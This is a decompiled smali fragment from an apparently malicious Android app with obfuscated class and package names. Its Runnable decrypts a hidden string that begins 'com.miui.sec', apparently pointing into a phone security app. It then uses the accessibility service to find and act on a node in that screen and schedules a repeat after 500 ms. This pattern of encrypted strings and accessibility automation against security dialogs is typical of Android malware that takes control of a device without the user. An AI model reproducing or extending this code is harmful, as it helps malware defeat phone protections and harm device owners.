.class Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a$a;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a;


# direct methods
.method constructor <init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a;)V
    .locals 0

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a$a;->e:Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x28

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->l0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a$a$a;

    invoke-direct {v1, p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a$a$a;-><init>(Lcom/vknnolqo/p9sv5zvf/JQgPaybB$e$a$a$a;)V

    const-wide/16 v2, 0x1f4

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_0
    return-void

    :array_0
    .array-data 1
        -0x42t
        -0x1ct
        -0x49t
        0x19t
        -0x3dt
        -0x13t
        -0x5at
        0x7bt
        -0xdt
        -0x8t
        -0x41t
        0x54t
        -0x25t
        -0xat
        -0x46t
        0x66t
        -0x5ct
        -0x18t
        -0x41t
        0x59t
        -0x26t
        -0x1ft
        -0x5ft
        0x28t
        -0x4ct
        -0x11t
        -0xbt
        0x45t
        -0x35t
        -0x19t
        -0x56t
        0x71t
        -0x4ft
        -0x12t
        -0x58t
        0x68t
        -0x28t
        -0x13t
        -0x4at
        0x65t
    .end array-data

    :array_1
    .array-data 1
        -0x23t
        -0x75t
        -0x26t
        0x37t
        -0x52t
        -0x7ct
        -0x2dt
        0x12t
    .end array-data
.end method
